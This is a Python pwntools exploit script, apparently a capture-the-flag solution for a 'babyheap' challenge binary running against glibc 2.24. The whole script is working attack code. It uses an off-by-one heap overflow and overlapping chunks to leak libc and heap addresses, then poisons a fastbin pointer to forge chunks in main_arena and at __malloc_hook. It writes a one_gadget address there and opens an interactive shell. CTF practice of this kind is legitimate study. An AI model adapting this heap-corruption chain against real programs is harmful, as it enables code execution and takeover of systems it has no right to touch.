from pwn import *

#io = remote('0.0.0.0', 10001)
io = process("./babyheap_debug")
libc = ELF('/usr/local/glibc-2.24/lib/libc-2.24.so')

def alloc(size):
	io.sendlineafter("Command: ", '1')
	io.sendlineafter("Size: ", str(size))

def update(idx, cont):
	io.sendlineafter("Command: ", '2')
	io.sendlineafter("Index: ", str(idx))
	io.sendlineafter("Size: ", str(len(cont)))
	io.sendafter("Content: ", cont)

def delete(idx):
	io.sendlineafter("Command: ", '3')
	io.sendlineafter("Index: ", str(idx))

def view(index):
	io.sendlineafter("Command: ", '4')
	io.sendlineafter("Index: ", str(index))
	io.recvuntil("]: ")
	return io.recvline()

def leak_libc():
	global libc_base

	alloc(0x48)			# chunk0
	alloc(0x48)			# chunk1
	alloc(0x48)			# chunk2
	alloc(0x48)			# chunk3

	update(0, "A"*0x48 + "\xa1")	# off by one
	delete(1)
	alloc(0x48)			# chunk1
	leak_addr = u64(view(2)[:8])
	libc_base = leak_addr - 0x398b58
	log.info("leak_addr: 0x%x" % leak_addr)
	log.info("libc_base: 0x%x" % libc_base)
	raw_input("###1")
	alloc(0x48)			# chunk4, overlap chunk2
	delete(1)
	delete(2)
	heap_addr = u64(view(4)[:8]) - 0x50
	log.info("heap_addr: 0x%x" % heap_addr)
	raw_input("###2")

def pwn():
	one_gadget = libc_base + 0x3f51a
	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	main_arena = libc_base + libc.symbols['main_arena']
	log.info("malloc_hook: 0x%x" % malloc_hook)
	log.info("main_arena: 0x%x" % main_arena)
	log.info("addr: 0x%x" % (main_arena + 0x25))

	alloc(0x58)			# chunk1
	delete(1)			# chunk1
	update(4, p64(main_arena + 0x25))				# fd
	alloc(0x48)			# chunk1
	alloc(0x48)			# chunk2, fake chunk at main_arena
	update(2, "A"*0x23 + p64(malloc_hook - 0x10))	# top
	raw_input("###3")
	alloc(0x48)			# chunk5, fake chunk at malloc_hook
	update(5, p64(one_gadget))						# malloc_hook
	raw_input("###4")

	alloc(1)
	io.interactive()

if __name__=='__main__':
	gdb.attach(io)
	leak_libc()
	pwn()
